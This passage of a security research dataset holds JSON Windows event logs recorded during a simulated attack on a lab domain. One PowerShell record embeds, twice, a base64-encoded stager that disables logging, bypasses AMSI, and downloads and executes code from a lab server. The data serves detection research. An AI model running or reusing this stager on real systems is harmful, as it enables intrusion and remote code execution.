{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"51070","FilterRTID":"71481","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:49","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.39.5","ProcessId":"9076","DestAddress":"10.10.10.5","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t9076\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t51070\r\n\tDestination Address:\t10.10.10.5\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t71481\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:49.999Z","LayerRTID":"48","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:48","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":7184,"RecordNumber":258650}
{"Task":106,"EventReceivedTime":"2020-07-22 00:18:50","Opcode":"To be used when operation is just executing a method","port":55069,"SeverityValue":2,"ActivityID":"{17E565D6-3A73-0000-11BB-DC81FF5DD601}","Keywords":0,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"Payload":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","tags":["mordorDataset"],"Domain":"MORDOR","SourceName":"Microsoft-Windows-PowerShell","UserID":"S-1-5-21-2253742117-2054739524-205962475-1104","Channel":"Microsoft-Windows-PowerShell/Operational","SourceModuleName":"eventlog","Message":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11265\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11265\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Category":"Executing Pipeline","@timestamp":"2020-07-22T04:18:51.000Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"pgustavo","ExecutionProcessID":9076,"EventType":"INFO","OpcodeValue":20,"EventTime":"2020-07-22 00:18:48","Severity":"INFO","EventID":4103,"ThreadID":5048,"RecordNumber":8716}
{"Task":12,"EventReceivedTime":"2020-07-22 00:18:50","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":2,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{b59756a9-b239-5f17-5307-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"9076","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","TargetObject":"HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-07-22 04:18:48.571\r\nProcessGuid: {b59756a9-b239-5f17-5307-000000000400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:18:48.571","@timestamp":"2020-07-22T04:18:51.000Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"OpcodeValue":0,"EventType":"CreateKey","EventTime":"2020-07-22 00:18:48","Severity":"INFO","EventID":12,"ThreadID":6244,"RecordNumber":1782118}
{"Task":12810,"Direction":"%%14592","Opcode":"Info","SourcePort":"58085","FilterRTID":"67835","LayerName":"%%14610","EventReceivedTime":"2020-07-22 00:18:50","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.6","ProcessId":"976","DestAddress":"172.18.38.5","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\svchost.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t976\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\svchost.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource Port:\t\t58085\r\n\tDestination Address:\t172.18.38.5\r\n\tDestination Port:\t\t135\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t67835\r\n\tLayer Name:\t\tReceive/Accept\r\n\tLayer Run-Time ID:\t44","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:51.000Z","LayerRTID":"44","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":5156,"DestPort":"135","ThreadID":5480,"RecordNumber":9020772}
{"Task":12810,"Direction":"%%14592","Opcode":"Info","SourcePort":"58086","FilterRTID":"67835","LayerName":"%%14610","EventReceivedTime":"2020-07-22 00:18:50","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.6","ProcessId":"704","DestAddress":"172.18.38.5","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\lsass.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t704\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\lsass.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource Port:\t\t58086\r\n\tDestination Address:\t172.18.38.5\r\n\tDestination Port:\t\t49667\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t67835\r\n\tLayer Name:\t\tReceive/Accept\r\n\tLayer Run-Time ID:\t44","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:51.000Z","LayerRTID":"44","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":5156,"DestPort":"49667","ThreadID":5480,"RecordNumber":9020773}
{"Task":12810,"Direction":"%%14592","Opcode":"Info","SourcePort":"65337","FilterRTID":"67835","LayerName":"%%14610","EventReceivedTime":"2020-07-22 00:18:50","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.6","ProcessId":"704","DestAddress":"172.18.38.5","Protocol":"17","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\lsass.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t704\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\lsass.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource 